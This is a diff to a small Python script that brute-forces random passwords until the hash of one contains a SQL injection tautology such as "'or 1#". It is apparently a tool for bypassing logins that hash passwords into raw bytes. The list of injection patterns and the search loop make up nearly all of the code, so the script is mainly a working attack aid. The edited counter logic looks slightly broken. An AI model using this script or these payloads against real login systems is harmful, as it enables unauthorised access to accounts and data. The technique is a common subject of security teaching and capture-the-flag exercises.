@@ -4,7 +4,7 @@ import re
 import binascii
 
 def newpassword():
-	pword = secrets.token_bytes(16)
+	pword = secrets.token_bytes(25)
 	return pword
 
 def hash(pword):
@@ -15,6 +15,7 @@ def hash(pword):
 
 
 if __name__ == "__main__":
+	a = 0
 	codes = ["'\s+OR\s+1#", "'\s+oR\s+1#", "'\s+or\s+1#", "'\s+Or\s+1#", "'OR\s+1#", "'or\s+1#", "'Or\s+1#", "'oR\s+1#", "'\s+\|\|\s+1#", "'\|\|\s+1#", "'\|\|'\s+1"]
 	patterns = []
 	for i in codes:
@@ -29,20 +30,13 @@ if __name__ == "__main__":
 	while match == None:
 		pword = newpassword()
 		hashed = hash(pword)
+		print(hashed)
 		for i in patterns:
 			match = re.search(i, hashed)
 			if match != None:
 				pword = pword.hex()
 				print(pword)
 				print(hashed)
-				print(i)
+				print(a)
 				break
-
-	# 	i += 1
-
-
-		
-
-
-
-
+	a += 1
